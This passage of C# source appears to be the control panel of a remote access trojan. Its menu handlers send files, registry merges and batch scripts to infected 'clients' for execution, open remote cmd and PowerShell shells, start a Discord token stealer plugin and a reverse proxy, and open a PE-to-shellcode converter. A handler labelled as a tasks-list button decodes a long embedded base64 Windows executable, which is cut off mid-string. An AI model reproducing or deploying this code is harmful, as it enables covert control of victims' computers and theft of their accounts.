                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (var file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The mergeRegToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void mergeRegToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "reg files (*.reg)|*.reg|All files (*.*)|*.*";
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (var file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The executebatToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void executebatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "bat files (*.bat)|*.bat|All files (*.*)|*.*";
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (var file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The cmdToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "shell";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ML.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    var shell = (FormShell)Application.OpenForms["shell:" + client.ID];
                    if (shell == null)
                    {
                        shell = new FormShell
                        {
                            Name = "shell:" + client.ID,
                            Text = "shell:" + client.ID,
                            F = this
                        };
                        shell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The powershellToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "powershell";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ML.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    var powershell = (FormPowerShell)Application.OpenForms["powershell:" + client.ID];
                    if (powershell == null)
                    {
                        powershell = new FormPowerShell
                        {
                            Name = "powershell:" + client.ID,
                            Text = "powershell:" + client.ID,
                            F = this
                        };
                        powershell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The discordStealerToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void discordStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\DCD.dll");

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                //new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The remoteReverseProxyToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void remoteReverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "ReverseProxy";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\RP.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                    var frmRS = new FrmReverseProxy(GetSelectedClients());
                    frmRS.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The peToShellConverterToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void peToShellConverterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var frmRS = new PeToShell();
            frmRS.Show();
        }

        /// <summary>
        /// The btnTASKSLISTVIEW_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnTASKSLISTVIEW_Click(object sender, EventArgs e)
        {
            /*
            //listView1
            if (!LISTVIEWTASKS.Visible)
                //guna2Transition1.HideSync(listView1);
                guna2Transition1.ShowSync(LISTVIEWTASKS);
            else
                //guna2Transition1.ShowSync(listView1);
                guna2Transition1.HideSync(LISTVIEWTASKS);
            */
            var frmRS = new PeToShell();
            frmRS.Show();
            Byte[] rdpinstallbytes = Convert.FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDABeug2MAAAAAAAAAAOAAAgELAQsAAHgDAACIAQAAAAAAzpYDAAAgAAAAoAMAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAABgBQAAAgAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAHSWAwBXAAAAAKADADSFAQAAAAAAAAAAAAAAAAAAAAAAAEAFAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA1HYDAAAgAAAAeAMAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADSFAQAAoAMAAIYBAAB6AwAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAEAFAAACAAAAAAUAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACwlgMAAAAAAEgAAAACAAUANIADAEAWAAABAAAAEwAABnolAAC6WgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKAEAAAoqHgIoBAAACiqmcwYAAAqAAQAABHMHAAAKgAIAAARzCAAACoADAAAEcwkAAAqABAAABCoAABMwAQAPAAAAAQAAEX4BAAAEbwoAAAoKKwAGKgATMAEADwAAAAIAABF+AgAABG8LAAAKCisABioAEzABAA8AAAADAAARfgMAAARvDAAACgorAAYqABMwAQAPAAAABAAAEX4EAAAEbw0AAAoKKwAGKgATMAIAEQAAAAUAABECAygRAAAKKBIAAAoKKwAGKgAAABMwAQALAAAABgAAEQIoEwAACgorAAYqABMwAQAPAAAABwAAEdAFAAACKBQAAAoKKwAGKgATMAEACwAAAAgAABECKBUAAAoKKwAGKgATMAEAGAAAAAkAABECjAEAABstCigBAAArCisGKwQCCisABioTMAIAEAAAAAoAABEDEgD+FQIAABsGgQIAABsqHgIoFwAACioTMAEAIAAAAAsAABF+GQAACowDAAAbLQooAgAAK4AZAAAKfhkAAAoKKwAGKh4CKBcAAAoqEzADAEEAAAAMAAARGI0WAAABCgYWcgEAAHCiBhdyRwAAcKIGcx0AAAqABwAABHKPAABwgAgAAARyqwAAcIAJAAAEcrsAAHCACgAABCoAAAAeAigXAAAKKhswBQAGAgAADQAAERcTBSgWAAAGLQ0YEwUoHgAACigfAAAKKCAAAAoXDRsTBX4HAAAEbyEAAAoMOAMBAAASAigiAAAKChwTBX4IAAAEKBcAAAZy3wAAcCgjAAAKBigkAAAKfgkAAAQVFiglAAAKFpooIwAACigkAAAKCx0TBQYoJAAACn4JAAAEFRYoJQAAChiacuMAAHAWKCYAAAoWMzseEwUHKCcAAAotLh8JEwUHBigkAAAKfgkAAAQVFiglAAAKFpooFQAABigoAAAKHwoTBQcoKQAACiYrWB8NEwUfDhMFBwYoJAAACn4JAAAEFRYoJQAAChaaKBUAAAYoKAAACh8PEwUGKCQAAAp+CQAABBUWKCUAAAoXmnLjAABwFigmAAAKFjMLHxATBQcoKQAACiYfExMFKCoAAAofFBMFEgIoKwAACjrx/v//EgL+FgoAABtvLAAACt2qAAAAEQQrBBEEF1gWEwRFFgAAAAAAAABG/v//UP7//13+//9d/v//ZP7//3/+//+1/v//2v7//+X+//8I////E////xP///8V////Gf///zz///9i////bf///23///9t////dv///5P////eNREFEwQJRQIAAAAAAAAAiP///94hdSMAAAEU/gMJFv4DXxEEFv4BX/4RdCMAAAEoLQAACt7LIDMACoAoLgAACnoRBCwFKCAAAAoqAABBHAAAAQAAAAAAAADQAQAA5QEAAAwAAADQAQAAGzAEAFoAAAAOAAARcy8AAAoKczAAAAoMBggoMQAACn4KAAAEbzIAAApvMwAACm80AAAKBhhvNQAACgZvNgAAChMEAg0RBAkWCY63bzcAAAoL3hHeDyUoLQAAChMFKCAAAAreAAcqAAABEAAAAAAMAD1JAA8jAAABEzACACgAAAAPAAARKDgAAAoLcu0AAHAHczkAAAoMCAJvOgAA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